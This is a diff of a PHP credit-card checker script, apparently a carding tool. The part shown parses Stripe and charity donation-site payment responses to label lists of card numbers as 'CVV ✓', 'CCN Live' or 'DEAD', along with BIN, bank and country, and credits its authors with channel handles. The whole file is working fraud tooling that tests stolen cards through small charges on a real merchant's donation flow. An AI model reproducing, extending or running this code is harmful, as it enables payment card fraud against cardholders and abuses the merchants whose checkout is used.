-    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-} 
-
-elseif
-(strpos($result2,  "Thank You.")) {
-    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-} 
-
-elseif
-(strpos($result2,  'Your card zip code is incorrect.')) {
-    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Your Card Zip Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-} 
-
-elseif
-(strpos($result2,  '/donations/thank_you?donation_number=','')) {
-    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation. }</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-} 
-
-elseif
-(strpos($result2,  "incorrect_zip")) {
-    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Incorrect Zip}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-} 
-
-
-elseif
-(strpos($result2,  '"type":"one-time"')) {
-    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">{MSG:- CCV MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-} 
-
-# -------------------------------------------------- [CVV Responses END ] ------------------------------------------------------ #
-
-
-
-# ----------------------------------------------------- [CCN Responses ] ------------------------------------------------------ #
-
-elseif
-(strpos($result2,  'security code is incorrect.')) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
+elseif ((strpos($result3, "Transaction Failed!! Your card has insufficient funds. Please try again or email us at info@ketto.org if the issue still persists (mention the email or phone number used for this transaction)")) || (strpos($result3, '"cvc_check": "fail"'))){
+    echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜ R ➜ Your card has insufficient funds.  ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif
-(strpos($result2,  'security code is invalid.')) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
+# - [CVV Responses ] - #
+
+
+# - [CCN Responses ] - #
+
+elseif ((strpos($result3, 'security code is incorrect.')) || (strpos($result3, "security code is invalid.")) || (strpos($result3, "Your card's security code is incorrect.")) || (strpos($result3, "incorrect_cvc"))){
+    echo '<br><span class="badge badge-warning">#CCN ✓ </span> : ' . $lista . ' ➜  CCN Live ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
+
+}
+#-[CCN Responses END ]- #
+
+
+
+#- [Stolen,Lost,Pickup Responses]- #
+
+elseif ((strpos($result3, 'stolen_card')) || (strpos($result3, "lost_card")) || (strpos($result3, "pickup_card."))){
+    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif
-(strpos($result2,  "Your card's security code is incorrect.")) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Your Card&#039;s Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  }
 
-elseif
-(strpos($result2,  "incorrect_cvc")) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Incorrect CVC.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
+# -- [Stolen,Lost,Pickup Responses END ] - #
+
+
+
+# -[Reprovada,Decline Responses ] - #
+
+elseif ((strpos($result3, 'Transaction Failed!! Your card was declined. Please try again or email us at info@ketto.org if the issue still persists (mention the email or phone number used for this transaction)')) || (strpos($result1, "generic_decline")) || (strpos($result3, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result3, "processing_error")) || (strpos($result3, "parameter_invalid_empty")) || (strpos($result3, 'lock_timeout')) || (strpos($result3, "transaction_not_allowed"))){
+    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-#----------------------------------------------------- [CCN Responses END ]------------------------------------------------------ #
-
-
-
-#--------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses]--------------------------------------------------- #
-
-elseif
-(strpos($result2,  "stolen_card")) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Stolen Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
+elseif ((strpos($result3, 'Payment cannot be processed, missing credit card number')) || (strpos($result3, "missing_payment_information")) || (strpos($result3, 'three_d_secure_redirect')) || (strpos($result3, '"cvc_check": "unchecked"')) || (strpos($result3, "service_not_allowed")) || (strpos($result3, '"cvc_check": "unchecked"')) || (strpos($result3, 'Your card does not support this type of purchase.')) || (strpos($result3, "transaction_not_allowed"))){
+    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif
-(strpos($result2,  "lost_card")) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Lost Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
+elseif (strpos($result3,  'Your card has expired.')) {
+  echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card has expired. ➜:  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif
-(strpos($result2,  'Your card has insufficient funds.')) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Your Card Has Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
+elseif (strpos($result3,  'Transaction Failed!! Invalid account. Please try again or email us at info@ketto.org if the issue still persists (mention the email or phone number used for this transaction)')) {
+  echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card number is incorrect. ➜  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif
-(strpos($result2,  "pickup_card")) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Pickup Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-}
-
-elseif
-(strpos($result2,  "insufficient_funds")) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-}
-
-elseif
-(strpos($result2,  '"cvc_check": "fail"')) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- CVC FAILED.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-}
-
-elseif
-(strpos($result2,  'security code is invalid.')) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Security Code Is Invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-}
-
-# -------------------------------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses END ] --------------------- #
+# - [Reprovada,Decline Responses END ] - #
 
 
 
-# --------------------------------------------------- [Reprovada,Decline Responses ] -------------------------------------------- #
-
-elseif
-(strpos($result2,  'Your card has expired.')) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  'Your card number is incorrect.')) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  "incorrect_number")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  'card was declined.')) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Card Was Declined</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  "generic_decline")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Generic Decline</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  "do_not_honor")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Do Not Honor The Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-
-elseif
-(strpos($result2,  "expired_card")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  'Your card does not support this type of purchase.')) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Does Not Support This Type Of Purchase.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  "processing_error")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Processing Error</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2, "service_not_allowed")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Service Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  '"cvc_check": "unchecked"')) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: CVC Unchecked</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  '"cvc_check": "unavailable"')) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: CVC Unavailable </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  "parameter_invalid_empty")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Parameter Invalid Empty</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  "lock_timeout")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Lock Timeout</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  "transaction_not_allowed")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Transaction Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2, "three_d_secure_redirect")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: 3D Secure Redirect</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Card Is Declined By Your Bank, Please Contact Them For Additional Information.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2, "missing_payment_information")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Missing Payment Information</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-elseif
-(strpos($result2, "Payment cannot be processed, missing credit card number")) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Payment Cannot Be Processed, Missing Credit Card Number</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  } 
-
-
-
-# ----------------------------------------------------- [Reprovada,Decline Responses END ] -------------------------------------- #
-
-
-
-# ------------------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] ---------------------------------- #
-
+# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #
 elseif 
-(strpos($result2,  '-1')) {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Update Nonce </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  }
+(strpos($result3,  '-1')) {
+    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Update Nonce ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
+}
 
 else {
-    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Dead Proxy/Error Not listed/CC Checker Dead</span> | <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span> | <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
-  }
-# --------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] --------------------------------------- #
+    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
+}
 
-# ----------------------------------------------------------- [Responses END] --------------------------------------------------- #
+# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #
+
+//=======================[Responses-END]==============================//
+
 
 curl_close($ch);
 ob_flush();
 
 echo "<b>1REQ Result:</b> $result1<br><br>";
 echo "<b>2REQ Result:</b> $result2<br><br>";
+echo "<b>3REQ Result:</b> $result3<br><br>";
 
-#---------------------------------------------------------------------------------------------------------------------------------#
-#---------------------------------------------------[MADE BY @ANONBD]----------------------------------------------------#
-#---------------------------------------------------------------------------------------------------------------------------------#
-
+//=============================================================//
+//================[Made By :- [🇮🇳]DRAGON MASTER]===============//
+//============[Join OUR TEAM   @DragonBin + @DRAGONCCCHECKER]==//
 ?>
